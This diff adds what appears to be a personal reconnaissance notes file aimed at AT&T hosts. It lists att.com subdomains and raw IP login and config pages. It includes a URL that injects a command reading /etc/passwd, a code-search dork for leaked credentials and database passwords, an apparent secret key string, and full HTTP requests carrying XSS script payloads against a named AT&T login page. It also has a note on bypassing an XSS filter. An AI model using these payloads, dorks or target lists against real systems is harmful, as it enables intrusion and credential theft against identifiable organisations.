@@ -1,0 +1,66 @@
+https://attmbl-usdev.att.com/auth_redirect.do?sysparm_stack=no&sysparm_url=
+https://captionconductor-mp.att.com/login.php?location=Lw==
+https://contentst001b-test.att.com/bin/mail%20root%20%3C/etc/passwd%3E
+https://116.197.159.112/login_up.php
+https://20.242.62.136/docs#operation/get~handle_request
+https://116.197.159.112/get_password.php
+view-source:https://116.197.159.112/login_up.php3
+y+7bE9B322e5STEmK9dAwJVf/N9maN4eQ5h1DT9d
+https://clec.att.com/clec/search/index.cfm --> cari bypass untuk ngelewatin filter XSS
+
+/[a-zA-Z0-9-]+\.att\.com/ AND  ("credentials" OR "config" OR "security_credentials" OR "connectionstring" OR "ssh2_auth_password" OR "DB_PASSWORD" OR "password") AND (NOT "www.att" NOT "help.att" NOT "support.att" NOT "research.att" NOT "developer.att" NOT "api.att" NOT "signin.att" NOT "m2x.att" NOT "e-access.att" NOT "DOMAIN-SUFFIX" NOT "cybersecurity.att" NOT "business.att" NOT "about.att") lang:JavaScript 
+
+
+GET /login.php?location=sajjad0000000000000000%/script><script> HTTP/1.1
+Host: captionconductor-mp.att.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+
+
+GET /login.php?location=<script+src=javascript:alert(1);><h1>sajjad<h1> HTTP/1.1
+Host: captionconductor-mp.att.com
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+
+
+view-source:https://myprice.att.com/commerce/display_company_profile.jsp?page=sajjad
+
+
+https://199.59.53.47/Authentication/Credentials?requestedPage=&requestedPath=%2f&requestedQueryString=&mobileViewportDetected=false
+
+
+GET /?test HTTP/1.1
+Host: astra-dev.att.com
+X-Amz-Server-Side-Encryption: POC
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+
+https://144.161.116.118/
+
+
+https://166.216.153.166:8081/ui/#/login
+https://201.130.47.229/index.html
+https://www.shodan.io/host/162.241.60.131#3306
+https://199.108.99.19/login.aspx
+https://32.13.166.1/
+https://24.47.238.188:7443/phone
+https://12.38.228.204/
+https://144.160.116.58/php/config.php
+
+https://52.167.74.251/examples/servlets/servlet/CookieExample
+https://12.183.31.11/appliance/login.ns
+https://204.178.9.71/manual/mod/mod_log_config.html
